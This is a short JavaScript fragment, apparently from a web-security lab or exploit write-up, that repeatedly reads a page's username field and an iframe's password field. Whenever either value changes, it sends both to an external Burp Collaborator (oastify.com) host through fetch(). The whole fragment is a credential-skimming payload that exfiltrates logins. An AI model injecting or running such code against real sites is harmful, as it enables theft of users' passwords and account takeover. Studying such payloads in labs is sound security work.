...
setInterval(()=> {
    ...
    if (element.value != old_username || iframe.contentDocument.getElementById('password').value !=  old_password) {
        fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?username:${element.value}s==direct-password-${iframe.contentDocument.getElementById('password').value }`)
